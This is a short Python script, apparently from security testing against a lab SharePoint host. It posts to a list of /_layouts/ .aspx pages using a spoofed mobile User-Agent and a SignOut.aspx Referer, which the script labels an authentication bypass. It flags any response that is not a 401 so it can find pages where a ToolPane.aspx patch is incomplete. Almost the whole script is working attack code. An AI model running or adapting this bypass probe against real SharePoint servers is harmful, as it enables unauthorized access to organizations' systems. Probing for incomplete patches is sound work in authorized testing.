# Test if other .aspx pages can be bypassed using the same technique
# Purpose: Check if patch is incomplete (only blocks ToolPane.aspx)

import requests

base_url = "http://10.10.10.166"
test_body = "test=data"

mobile_ua = "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3"

# Test different .aspx files under /_layouts/ with signout referer
test_cases = [
    "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
    "/_layouts/15/Settings.aspx",
    "/_layouts/15/viewlsts.aspx",
    "/_layouts/15/people.aspx",
    "/_layouts/15/user.aspx",
    "/_layouts/15/AccessDenied.aspx",
    "/_layouts/15/Error.aspx",
    "/_layouts/15/Authenticate.aspx",
    "/_layouts/Authenticate.aspx",
    "/_layouts/Settings.aspx",
]

for endpoint in test_cases:
    print(f"\n[*] Testing: {endpoint}")
    headers = {
        "User-Agent": mobile_ua,
        "Referer": "/_layouts/SignOut.aspx",  # Auth bypass referer
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"
    }
    
    try:
        response = requests.post(f"{base_url}{endpoint}", headers=headers, data=test_body, timeout=10)
        print(f"    Status: {response.status_code}")
        if response.status_code != 401:
            print(f"    *** POTENTIAL BYPASS! ***")
            print(f"    Response snippet: {response.text[:300]}")
    except Exception as e:
        print(f"    Error: {e}")
